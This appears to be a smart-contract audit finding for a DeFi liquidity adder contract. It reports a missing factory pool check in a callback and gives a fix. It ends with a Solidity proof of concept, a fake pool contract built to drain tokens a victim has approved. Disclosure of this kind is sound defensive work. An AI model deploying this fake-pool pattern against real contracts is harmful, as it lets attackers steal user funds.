### Title
Missing Factory Pool Validation in `metricOmmModifyLiquidityCallback` Allows Malicious Pool to Drain User Tokens - (`metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol`)

### Summary

`MetricOmmPoolLiquidityAdder.metricOmmModifyLiquidityCallback` validates that `msg.sender` matches the pool stored in transient context, but never verifies that pool is registered on the factory. An attacker who deploys a fake pool contract and induces a victim to call `addLiquidityExactShares` with that address can drain any ERC-20 token the victim has approved to the `MetricOmmPoolLiquidityAdder`, up to the caller-supplied `maxAmountToken0`/`maxAmountToken1` caps.

### Finding Description

`MetricOmmSimpleRouter` enforces factory provenance on every pool it touches: [1](#0-0) 

```solidity
function _requireExpectedCallbackCaller(address caller) internal view {
    TransientCallbackPool.requireCaller(caller);
    if (!FACTORY.isPool(caller)) revert IMetricOmmSimpleRouter.InvalidPool(caller);
}
```

`MetricOmmPoolLiquidityAdder` deliberately omits this check. Its own NatDoc acknowledges the gap: [2](#0-1) 

> "This contract does not verify the pool against the factory; a malicious pool can request token pulls up to the caller-provided max caps during callback settlement."

The callback validates only that `msg.sender` equals the pool stored in transient context: [3](#0-2) 

```solidity
(address expectedPool, address payer, uint256 max0, uint256 max1) = _loadPayContext();
if (expectedPool == address(0)) revert CallbackContextNotActive();
if (msg.sender != expectedPool) revert InvalidCallbackCaller(msg.sender, expectedPool);
if (amount0Delta > max0 || amount1Delta > max1) {
    revert MaxAmountExceeded(amount0Delta, amount1Delta, max0, max1);
}
```

After passing those checks the callback reads token addresses from the caller itself: [4](#0-3) 

```solidity
PoolImmutables memory imm = IMetricOmmPool(msg.sender).getImmutables();
address token0 = imm.token0;
address token1 = imm.token1;
if (amount0Delta > 0) {
    pay(token0, payer, msg.sender, amount0Delta);
}
if (amount1Delta > 0) {
    pay(token1, payer, msg.sender, amount1Delta);
}
```

Because `msg.sender` is the attacker's fake pool, `token0`/`token1` are attacker-controlled. `pay` then executes: [5](#0-4) 

```solidity
} else {
    IERC20(token).safeTransferFrom(payer, recipient, value);
}
```

`payer` is the victim, `recipient` is the attacker's pool, and `value` is up to `max0`/`max1`. Any ERC-20 the victim has approved to `MetricOmmPoolLiquidityAdder` is transferred to the attacker.

The transient context is set in `_addLiquidity` with no factory check on the pool argument: [6](#0-5) 

```solidity
_setPayContext(pool, payer, maxAmountToken0, maxAmountToken1);
try IMetricOmmPoolActions(pool)
    .addLiquidity(positionOwner, salt, deltas, abi.encode(KIND_PAY), extensionData) returns (
    uint256 a0, uint256 a1
) {
```

### Impact Explanation

A victim who has approved `MetricOmmPoolLiquidityAdder` to spend their tokens (required for normal use) and who calls `addLiquidityExactShares` or `addLiquidityWeighted` with an attacker-supplied pool address loses up to `maxAmountToken0` of any token the attacker names as `token0` and `maxAmountToken1` of any token named as `token1`. The attacker receives those tokens directly. This is a direct, irreversible loss of user principal.

### Likelihood Explanation

The attack requires the victim to call the adder with a malicious pool address. This can be achieved via phishing, a malicious front-end, or a compromised integration that passes an unverified pool address. Users who have already approved the adder (a prerequisite for any liquidity operation) are permanently at risk until they revoke the approval. The `MetricOmmSimpleRouter` already demonstrates the correct pattern, confirming the omission in the adder is not intentional from a security standpoint despite the NatDoc note.

### Recommendation

Add a factory pool check inside `_addLiquidity` (or at the top of each public entry point) before storing the pool in transient context, mirroring `MetricOmmSwapRouterBase._requireFactoryPool`:

```solidity
function _addLiquidity(
    address pool,
    ...
) internal returns (...) {
    if (!FACTORY.isPool(pool)) revert InvalidPool(pool); // add this
    _setPayContext(pool, payer, maxAmountToken0, maxAmountToken1);
    ...
}
```

This requires adding an immutable `FACTORY` reference to `MetricOmmPoolLiquidityAdder`, consistent with how `MetricOmmSwapRouterBase` holds it.

### Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.35;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {LiquidityDelta} from "@metric-core/types/PoolOperation.sol";
import {PoolImmutables} from "@metric-core/interfaces/IMetricOmmPool/IMetricOmmPool.sol";
import {IMetricOmmModifyLiquidityCallback}
    from "@metric-core/interfaces/callbacks/IMetricOmmModifyLiquidityCallback.sol";
import {MetricOmmPoolLiquidityAdder} from "metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol";

/// @notice Fake pool: returns attacker-chosen tokens from getImmutables(),
///         calls back the adder with KIND_PAY and the full max amounts.
contract MaliciousPool {
    address public immutable VICTIM_TOKEN;
    address public immutable ATTACKER;
    MetricOmmPoolLiquidityAdder public immutable ADDER;

    constructor(address victimToken, address attacker, address adder) {
        VICTIM_TOKEN = victimToken;
        ATTACKER = attacker;
        ADDER = MetricOmmPoolLiquidityAdder(payable(adder));
    }

    // Called by MetricOmmPoolLiquidityAdder._addLiquidity
    function addLiquidity(
        address, uint80, LiquidityDelta memory, bytes calldata, bytes calldata
    ) external returns (uint256, uint256) {
        // Callback with KIND_PAY (1) and full max amounts
        ADDER.metricOmmModifyLiquidityCallback(
            1000e18, // amount0Delta = victim's max0
            0,
            abi.encode(uint8(1)) // KIND_PAY
        );
        return (1000e18, 0);
    }

    // Returns attacker-controlled token addresses
    function getImmutables() external view returns (PoolImmutables memory imm) {
        imm.token0 = VICTIM_TOKEN; // drain this token from victim
        imm.token1 = address(0);
    }
}

contract PoC {
    function exploit(
        MetricOmmPoolLiquidityAdder adder,
        address victimToken,
        address victim,
        address attacker
    ) external {
        MaliciousPool fakePool = new MaliciousPool(victimToken, attacker, address(adder));

        // Victim must have approved adder for victimToken (normal prerequisite).
        // Attacker tricks victim into calling addLiquidityExactShares with fakePool.
        // Simulated here as if victim is calling:
        LiquidityDelta memory delta;
        delta.binIdxs = new int256[](1);
        delta.shares  = new uint256[](1);
        delta.binIdxs[0] = 0;
        delta.shares[0]  = 1;

        // victim calls (social-engineered):
        adder.addLiquidityExactShares(
            address(fakePool),
            victim,
            0,
            delta,
            1000e18, // maxAmountToken0 â€“ full victim balance
            0,
            ""
        );
        // Result: 1000e18 of victimToken transferred from victim to fakePool (attacker).
    }
}
```
